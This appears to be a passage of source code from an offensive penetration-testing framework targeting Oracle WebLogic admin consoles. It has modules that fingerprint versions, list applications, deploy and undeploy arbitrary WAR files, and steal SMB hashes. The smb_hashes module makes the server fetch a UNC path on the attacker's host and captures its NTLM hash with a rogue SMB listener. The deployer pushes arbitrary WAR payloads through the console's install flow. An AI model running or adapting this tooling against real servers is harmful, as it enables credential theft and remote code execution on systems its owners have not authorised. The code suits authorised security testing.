        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/console/console.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage"

        if fingerprint.title is WINTERFACES.WLS:
            base = base.replace("http", "https")

        response = utility.requests_get(base + uri, cookies=cookies[0])
        if response.status_code == 200:

            data = findall(r"title=\"Select (.*?)\"", response.content)
            if len(data) > 0:
                for entry in data:
                   utility.Msg("App found: %s" % entry)
            else:
                utility.Msg("No applications found.")

########NEW FILE########
__FILENAME__ = smb_hashes
from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from src.lib.cifstrap import Handler
from auxiliary import Auxiliary
from threading import Thread
from log import LOG
from re import findall
from time import sleep
from os import getuid
import socket
import utility
import state


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ["10", "12"]
        self.show = True
        self.flag = 'wl-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.title in [WINTERFACES.WLA, WINTERFACES.WLS]:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Same as JBoss/Tomcat
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/console/console.portal?AppApplicationInstallPortlet_actionOverride'\
              '=/com/bea/console/actions/app/install/appSelected'
        data = { "AppApplicationInstallPortletselectedAppPath" :
                 "\\\\{0}\\fdas.war".format(utility.local_address()),
                 "AppApplicationInstallPortletfrsc" : None
                }

        if fingerprint.title is WINTERFACES.WLS:
            base = base.replace("http", "https")

        utility.Msg("Host %s:%s requires auth, checking.." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint)

        if cookies[0]:

            utility.Msg("Setting up SMB listener...")
            self._Listen = True
            thread = Thread(target=self.smb_listener)
            thread.start()

            # fetch our CSRF
            data['AppApplicationInstallPortletfrsc'] = self.fetchCSRF(base, cookies[0])

            utility.Msg("Invoking UNC loader...")

            try:
                _ = utility.requests_post(base+uri, data=data, cookies=cookies[0],
                                timeout=1.0)
            except:
                # we dont care about the response here
                pass
        else:
            utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

        while thread.is_alive():
            # spin
            sleep(1)

        self._Listen = False

    def fetchCSRF(self, base, cookie):
        """ Our install request requires a CSRF token
        """

        uri = '/console/console.portal?_nfpb=true&_pageLabel=AppApplicationInstallPage'

        response = utility.requests_get(base+uri, cookies=cookie)
        if response.status_code == 200:

            data = findall('AppApplicationInstallPortletfrsc" value="(.*?)"',
                            response.content)
            if len(data) > 0:
                return data[0]

    def smb_listener(self):
        """ Setup the SMB listener
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(state.timeout)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                try:
                    (con, addr) = sock.accept()
                except:
                    # timeout
                    return

                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive() and self._Listen:
                    # spin...
                    sleep(1)

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()

########NEW FILE########
__FILENAME__ = webs_deploy
from src.platform.weblogic.interfaces import WINTERFACES
import src.platform.weblogic.deployers.web_deploy as web_deploy


versions = ["10", "11", "12"]
title = WINTERFACES.WLS
def deploy(fingerengine, fingerprint):
    return web_deploy.deploy(fingerengine, fingerprint)

########NEW FILE########
__FILENAME__ = web_deploy
from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from src.module.deploy_utils import parse_war_path
from collections import OrderedDict
from os.path import abspath
from re import findall
from log import LOG
import utility


versions = ["10", "11", "12"]
title = WINTERFACES.WLA
def deploy(fingerengine, fingerprint):
    """ Multistage process of uploading via the web interface; not as neat
    as using the CLI tool, but now we don't need to rely on any enormous
    libraries.
    """
 
    cookies = checkAuth(fingerengine.options.ip, fingerprint)
    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file, True)

    if not cookies[0]:
        utility.Msg("This module requires valid credentials.", LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}..".format(war_name))

    base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
    if fingerprint.title is WINTERFACES.WLS:
        base = base.replace("http", "https")

    # first step is to upload the application
    uri = "/console/console.portal?AppApplicationInstallPortlet_actionOverride="\
          "/com/bea/console/actions/app/install/uploadApp"
    files = OrderedDict([
                    ('AppApplicationInstallPortletuploadAppPath', (war_name, open(war_file, "rb"))),
                    ('AppApplicationInstallPortletuploadPlanPath', (''))
                    ])
    csrf_token = fetchCSRF(cookies, base)

    data = { "AppApplicationInstallPortletfrsc" : csrf_token}
    response = utility.requests_post(base + uri, files=files, cookies=cookies[0],
                                    data = data) 
    if response.status_code is not 200:
        utility.Msg("Failed to upload (HTTP %d)" % response.status_code)
        return


    utility.Msg("Upload successful, deploying...")

    # second step is to select the recently uploaded app and set path
    path = findall('name="AppApplicationInstallPortletselectedAppPath" id="formFC1"'\
                   ' size="64" value="(.*?)">', response.content)[0]

    uri = "/console/console.portal?AppApplicationInstallPortlet_actionOverride"\
          "=/com/bea/console/actions/app/install/appSelected"
    data = { "AppApplicationInstallPortletselectedAppPath" : path,
             "AppApplicationInstallPortletfrsc" : csrf_token
           }

    response = utility.requests_post(base + uri, cookies=cookies[0], data=data)
    if response.status_code is not 200:
        utility.Msg("Failed to set selected path (HTTP %d)" % response.status_code, LOG.ERROR)
        return

    # third step is set the target type, which is by default Application
    uri = "/console/console.portal?AppApplicationInstallPortlet_actionOverride=/com/"\
          "bea/console/actions/app/install/targetStyleSelected"
    data = { "AppApplicationInstallPortlettargetStyle" : "Application",
             "AppApplicationInstallPortletfrsc" : csrf_token
           }

    response = utility.requests_post(base + uri, cookies=cookies[0], data=data)
    if response.status_code is not 200:
        utility.Msg("Failed to set type (HTTP %d)" % response.status_code, LOG.ERROR)
        return

    # final step; deploy it
    uri = "/console/console.portal?AppApplicationInstallPortlet_actionOverride=/com/"\
          "bea/console/actions/app/install/finish"
    data = {"AppApplicationInstallPortletname" : war_name,
            "AppApplicationInstallPortletsecurityModel" : "DDOnly",
            "AppApplicationInstallPortletstagingStyle" : "Default",
            "AppApplicationInstallPortletplanStagingStyle" : "Default",
            "AppApplicationInstallPortletfrsc" : csrf_token
           }

    try:
        response = utility.requests_post(base + uri, cookies=cookies[0], data=data)
    except:
        pass
    else:
        utility.Msg("Failed to finish deploy (HTTP %d)" % response.status_code, LOG.ERROR)
        return

    utility.Msg("{0} deployed at /{0}/".format(war_name), LOG.SUCCESS)


def fetchCSRF(cookies, base):
    """ Each deploy step requires a CSRF, but it doesn't change throughout the
    entire process, so we'll only need to fetch it once.
    """

    uri = '/console/console.portal?_nfpb=true&_pageLabel=AppApplicationInstallPage'

    response = utility.requests_get(base + uri, cookies=cookies[0])
    if response.status_code is 200:

        data = findall('AppApplicationInstallPortletfrsc" value="(.*?)">', response.content)
        if len(data) > 0:
            return data[0]

########NEW FILE########
__FILENAME__ = WL10
from src.platform.weblogic.interfaces import WLConsole

class FPrint(WLConsole):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "10"

########NEW FILE########
__FILENAME__ = WL10s
from src.platform.weblogic.interfaces import WINTERFACES, WLConsole


class FPrint(WLConsole):
    """ WebLogic 10 is bugged when using Oracle's custom implementation of SSL.
    Only if the default Java implementation is set will this work; otherwise,
    Oracle sends an SSL23_GET_SERVER_HELLO and breaks OpenSSL.
    """
        
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "10"
        self.title = WINTERFACES.WLS
        self.port = 9002
        self.ssl = True

########NEW FILE########
__FILENAME__ = WL11
from src.platform.weblogic.interfaces import WLConsole

class FPrint(WLConsole):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "11"

########NEW FILE########
__FILENAME__ = WL11s
from src.platform.weblogic.interfaces import WINTERFACES, WLConsole

class FPrint(WLConsole):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "11"
        self.title = WINTERFACES.WLS
        self.port = 9002
        self.ssl = True

########NEW FILE########
__FILENAME__ = WL12
from src.platform.weblogic.interfaces import WLConsole


class FPrint(WLConsole):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "12"

########NEW FILE########
__FILENAME__ = WL12s
from src.platform.weblogic.interfaces import WINTERFACES, WLConsole


class FPrint(WLConsole):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "12"
        self.title = WINTERFACES.WLS
        self.port = 9002
        self.ssl = True

########NEW FILE########
__FILENAME__ = WL7
from src.platform.weblogic.interfaces import BEAConsole

class FPrint(BEAConsole):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "7.0"

########NEW FILE########
__FILENAME__ = WL81
from src.platform.weblogic.interfaces import BEAConsole

class FPrint(BEAConsole):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "8.1"

########NEW FILE########
__FILENAME__ = interfaces
from requests import exceptions
from cprint import FingerPrint
from log import LOG
import utility

class WINTERFACES:
    WLA = "WebLogic Admin Console"
    WLS = "WebLogic Admin Console (https)"

class WLConsole(FingerPrint):
    """ Oracle was kind enough to embed the version string right into the 
    default console page.
    """

    def __init__(self):
        self.platform = "weblogic"
        self.version = None
        self.title = WINTERFACES.WLA
        self.uri = "/console"
        self.port = 7001
        self.hash = None

    def check(self, ip, port = None):
        """ Pull the version string out of the page.
        """

        try:
            rport = self.port if port is None else port

            url = "{0}://{1}:{2}{3}".format("https" if "ssl" in dir(self) and self.ssl else "http",
                                            ip, rport, self.uri)
            response = utility.requests_get(url)

            if "WebLogic Server Version: {0}.".format(self.version) in response.content:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)
        except exceptions.ConnectionError, e:
            utility.Msg("{0} connection error to {1}:{2} ({3})".format(
                                                                self.platform,
                                                                ip, rport, e),
                                                                LOG.DEBUG)

        return False


class BEAConsole(FingerPrint):
    """ Old versions of BEA WebLogic admin console have the version strings
    embedded into the login page.
    """

    def __init__(self):
        self.platform = "weblogic"
        self.version = None
        self.title = WINTERFACES.WLA
        self.uri = "/console"
        self.port = 7001
        self.hash = None

    def check(self, ip, port = None):
        """ Pull the version string out of the page.
        """

        try:
            rport = self.port if port is None else port
            response = utility.requests_get("http://{0}:{1}{2}".format(
                                    ip, rport, self.uri))

            if "BEA WebLogic Server {0}".format(self.version) in response.content:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                    ip, rport),
                                                    LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                    ip, rport),
                                                    LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = undeployer
from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from log import LOG
from re import findall
from requests import exceptions
import utility

titles = [WINTERFACES.WLA, WINTERFACES.WLS]
def undeploy(fingerengine, fingerprint):
    """ Undeploy a deployed application from the remote WL server
    """

    app = fingerengine.options.undeploy
    # ensure it ends with war
    app = app if '.war' in app else app + '.war'

    base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
    if fingerprint.title is WINTERFACES.WLS:
        base = base.replace("http", "https")

    uri = "/console/console.portal?AppApplicationUninstallPortletreturnTo="\
          "AppAppApp&AppDeploymentsControlPortlethandler="\
          "com.bea.console.handles.JMXHandle(\"com.bea:Name=mydomain,Type=Domain\")"
    data = { "all" : "on",
            "AppApplicationUninstallPortletchosenContents" : 
                    "com.bea.console.handles.AppDeploymentHandle%28%22com.bea"\
                    "%3AName%3D{0}%2CType%3DAppDeployment%22%29".format(app),
            "_pageLabel" : "AppApplicationUninstallPage",
            "_nfpb" : "true",
            "AppApplicationUninstallPortletfrsc" : None
           }

    utility.Msg("Host %s:%s requires auth, checking.." % 
                    (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
    cookies = checkAuth(fingerengine.options.ip, fingerprint, True)
    
    if cookies[0]:

        data['AppApplicationUninstallPortletfrsc'] = fetchCSRF(base, cookies[0])

        try:
            utility.requests_post(base + uri, data=data, cookies=cookies[0], timeout=1.0)
        except exceptions.Timeout:
            utility.Msg("{0} undeployed.".format(app), LOG.SUCCESS)
        else:
            utility.Msg("Failed to undeploy {0}".format(app), LOG.ERROR)

    else:
        utility.Msg("Could not get auth for %s:%s" % 
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)


def fetchCSRF(base, cookie):
    """ WebLogic does awkward CSRF token stuff
    """

    uri = '/console/console.portal?_nfpb=true&_pageLabel=AppApplicationInstallPage'

    response = utility.requests_get(base+uri, cookies=cookie)
    if response.status_code == 200:

        data = findall('AppApplicationInstallPortletfrsc" value="(.*?)"',
                        response.content)
        if len(data) > 0:
            return data[0]


def fetchDomain(base, cookie):
    """ Fetch the remote domain we're undeploying from
    """

    uri = ""

########NEW FILE########
